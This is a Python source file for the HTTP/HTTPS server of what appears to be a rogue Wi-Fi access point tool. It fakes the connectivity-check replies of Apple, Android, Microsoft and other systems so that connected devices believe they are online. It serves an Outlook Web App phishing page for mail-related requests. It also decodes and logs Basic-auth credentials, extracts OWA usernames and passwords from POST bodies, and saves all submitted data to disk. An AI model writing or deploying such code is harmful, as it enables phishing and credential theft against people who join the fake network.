from threading import Lock,Thread
import BaseHTTPServer
from SocketServer import ThreadingMixIn, TCPServer, BaseRequestHandler
import os
import ssl
import base64
import json
import time

from Utils import *

class Webserver(Thread):
  daemon=True
  def __init__(self, app, port = 80):
    Thread.__init__(self)
    self.app = app
    self.port = port

  def run(self):
    set_title('webserver %s'%self.port)
    self.app.log("[+] Starting HTTP server on port %d"%self.port)
    server_class=HTTPServer
    handler_class=HTTPRequestHandler
    server_address = ('', self.port)
    httpd = server_class(server_address, self.app, handler_class)
    httpd.PRE = "HTTP"
    httpd.serve_forever()
    self.app.log("[%s] HTTP server on port %d is shutting down"%(ctxt('x',RED),self.port))

class SSLWebserver(Webserver):
  def __init__(self, app, port = 443):
    self.PRE="HTTPS"
    Webserver.__init__(self, app, port)

  def run(self):
    set_title('webserver %s'%self.port)
    self.app.log("[+] Starting HTTPS server on port %d"%self.port)
    server_class=HTTPServer
    handler_class=HTTPRequestHandler
    server_address = ('', self.port)
    httpd = server_class(server_address, self.app, handler_class)
    httpd.PRE = "HTTPS"
    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=self.app.KEYFILE, certfile=self.app.CERTFILE, server_side=True)
    httpd.serve_forever()
    self.app.log("[%s] HTTPS server on port %d is shutting down"%(ctxt("x",RED),self.port))

class HTTPServer(ThreadingMixIn, BaseHTTPServer.HTTPServer):
  allow_reuse_address = True
  daemon_threads = True

  def __init__(self, server_address, app, RequestHandlerClass, bind_and_activate=True, www = None):
    BaseHTTPServer.HTTPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)
    self.app = app
    self.PRE = ''
    self.www_directory = www

class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
  
  
  def log_message(self, format, *args):
    pass
  
  def _parse_url(self):
    # parse URL
    path = self.path.strip('/')
    sp = path.split('?')
    if len(sp) == 2:
        path, params = sp
    else:
        path, = sp
        params = None
    args = path.split('/')

    return path,params,args
  
  def headers_to_text(self):
    return '\n'.join([
        "%s:%s"%(k,self.headers[k]) for k in self.headers.keys()
      ])

  def do_GET(self):
    client = self.client_address[0]
    client_mac = self.server.app.get_client_bssid(client)
    path,params,args = self._parse_url()
    host = self.headers.get('Host')
    if host is None:
      host = ''
    fullpath =  "%s%s"%(host,self.path)
    essid = ""
    try:
      essid = self.server.app.get_client_ap(client).get_essid()
    except:
      pass
    
    protocol = ctxt(self.server.PRE,BLUE)
    if self.server.PRE == 'HTTPS':
      protocol = ctxt(self.server.PRE,RED)
    self.server.app.log( "%s %s GET: %s => %s"%(essid,protocol,client,fullpath) )

    self.server.app.guessr.feed_http_request(client_mac, self.server.PRE, path, params, self.headers)

    if len(self.headers) > 0:
      self.server.app.log( ctxt(" /headers", BLUE))
      for k in self.headers:
        self.server.app.log( "%s> %s:%s"%(ctxt(" |\\--",BLUE),k,self.headers.get(k)) )

    try:
      if params is not None:
        try:
          self.server.app.log( ctxt(" /params", YELLOW))
          for kv in params.split('&'):
            if kv is None:
              continue
            k,v = kv.split('=')
            try:
              s = base64.b64decode(v)
              # try to decode as utf8, do not use decoded string
              s.decode('utf8')
              self.server.app.log( "%s> %s:%s (B64: %s)"%(ctxt(" |\\--",YELLOW),k,v,s) )
            except Exception as e:
              self.server.app.log( "%s> %s:%s"%(ctxt(" |\\--",YELLOW),k,v) )
        except:
          pass

    except Exception as e:
      raise

    if self.headers.get('user-agent') is not None:
        #self.headers.get('user-agent')
        pass

    http_auth = self.headers.get('Authorization')
    if http_auth is not None:
      haparams = http_auth.split(' ')
      if haparams[0] == 'Basic':
        self.server.app.log( "%s HTTP Basic authorization from %s to host %s: %s"%(
          ctxt('[*]',YELLOW),
          client,
          host,
          ctxt(base64.decodestring(haparams[1]), YELLOW)))
      else:
        self.server.app.log( "%s HTTP %s authorization from %s to host %s: %s"%(
          ctxt('[*]',YELLOW),
          haparams[0],
          client,
          host,
          http_auth))

    def logfaked():
      self.server.app.log("(%s)"%ctxt("faked",YELLOW))

    def logphishing():
      self.server.app.log("(%s)"%ctxt("phishing",YELLOW))

    

    faked = True

    if path == 'generate_204' or path == 'gen_204' or path == 'mobile/status.php':
      self.send_response(204)
      self.end_headers()
      logfaked()

    elif path == 'ncsi.txt':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('Microsoft NCSI')
      logfaked()

    elif path == 'hotspot-detect.html' or path == 'library/test/success.html':
      data = '''<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html>
<head>
  <title>Success</title>
</head>
<body>Success</body>
</html>'''
      self.send_response(200)
      self.end_headers()
      self.wfile.write(data)
      logfaked()

    elif path == 'connecttest.txt':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('Microsoft Connect Test')
      logfaked()

    elif path == 'files/vpn_ssid.txt':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('SSID\nStarbucks\nKFC\nMcDonalds\n')
      logfaked()

    elif path == 'files/emupdate/pong.txt':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('1')
      logfaked()

    elif path == 'data/config_cleanmaster_version.json':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('{"errno":"0","data":{"kbd":"%d"}}'%int(time.time()))
      logfaked()

    elif host == 'captive.apple.com':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>')
      logfaked()
    
    elif path == 'FileManager/v2/check.action':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('{"status":"1"}')
      logfaked()

    elif path == '/pep/gcc':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('FR\n')
      logfaked()

    elif path.startswith('doss/dxbb/upload_file'):
      self.send_response(200)
      self.end_headers()
      self.wfile.write('WIFIFREEKEY_TEST_REDIRECTOR_PAGE\n')
      logfaked()

    elif path == 'dot/wifiinfo':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('{"retcode":0}\n')
      logfaked()

    elif host == 'check.googlezip.net' and path == 'connect':
      self.send_response(200)
      self.end_headers()
      self.wfile.write('OK')
      logfaked()

    elif path == 'v1/wifi/EN/':
      self.send_response(200)
      self.end_headers()
      self.wfile.write("""
<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache" />
<META HTTP-EQUIV="Pragma" CONTENT="no-cache" />
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="HandheldFriendly" content="true">
<title>BlackBerry | Now Connected</title>
</head>
<!-- Do not remove: 74dfa016-f57e-4b3a-bf33-a817b00c44a2 -->
<body rel="74dfa016-f57e-4b3a-bf33-a817b00c44a2">
<p><img src="http://icc.blackberry.com/v1/wifi/logo.gif" alt="BlackBerry"></p>
<p>Your BlackBerry device is now connected to the Internet.</p>
</body>
</html>""")
      logfaked()

    elif "mail" in path or "mail" in host:
      self.send_response(200)
      self.end_headers()
      self.wfile.write(open('OutlookWebApp.html','r').read())
      logphishing()

    else:
      self.send_response(200)
      self.end_headers()
      faked = False

    uri = "%s://%s"%(self.server.PRE.lower(),fullpath)
    self.server.app.db.new_service_request(
      client_mac, 'HTTP', 'GET', uri, '', self.headers_to_text(), faked)

  def do_POST(self):
    client = self.client_address[0]
    client_mac = self.server.app.get_client_bssid(client)
    path,params,args = self._parse_url()
    host = self.headers.get('Host')
    fullpath =  "%s/%s"%(host,path)
    
    essid = ""
    try:
      essid = self.server.app.get_client_ap(client).get_essid()
    except:
      pass

    self.server.app.guessr.feed_http_request(client_mac, self.server.PRE, self.path, params, self.headers)

    protocol = ctxt(self.server.PRE,BLUE)
    if self.server.PRE == 'HTTPS':
      protocol = ctxt(self.server.PRE,RED)
    self.server.app.log( "%s %s POST: %s => %s"%(essid,protocol,client,fullpath) )
    for k in self.headers:
      self.server.app.log( "%s> %s:%s"%(ctxt(" |\\--",BLUE),k,self.headers.get(k)) )
    
    try:
      if self.headers.get('Authorization') is not None:
        authorization = self.headers.get('Authorization').split(' ')
        if authorization[0] == 'Basic':
          user_password = base64.b64decode(authorization[1])
          login,password = user_password.split(':')
          user = {'uri':fullpath,'login': login,  'password':password}
          self.server.app.log_login(client, user)
    except Exception as e:
      print e
    
    # get content
    post = ''
    if self.headers.has_key('Content-Length'):
      length = int(self.headers['Content-Length'])
      post = self.rfile.read(length)

      if host == 't.appsflyer.com' and path == 'api/v2.3/androidevent':
        model = self.headers.get('model')
        lang = self.headers.get('lang')
        operator = self.headers.get('operator')
        brand = self.headers.get('brand')
        country = self.headers.get('country')
        self.server.app.log( "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang))

      elif path == 'owa/auth.owa':
        
        try:
          kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
          self.server.app.log( "%s login is %s"%(fullpath, 
            ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
          user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
          self.server.app.log_login(client, user)
        except:
          raise
            
      #save content
      if length > 0:
        bssid = self.server.app.get_client_bssid(client)
        name = os.path.join(self.server.app.logpath,"%s_%s_%d"%(bssid,host,1000*time.time()))
        f = open(name,'w')
        f.write(post)
        f.close()
        self.server.app.log( "[+] %s from %s to %s (%s)"%(ctxt("saved post request",GREEN), client, fullpath, name))
    
    if path == 'gen_204':
      self.send_response(204)
    else:
      self.send_response(200)
      
    client_mac = self.server.app.get_client_bssid(client)
    uri = "%s://%s"%(self.server.PRE.lower(),fullpath)
    self.server.app.db.new_service_request(
      client_mac, 'HTTP', 'POST', uri, post, self.headers_to_text(), False)

    self.end_headers()
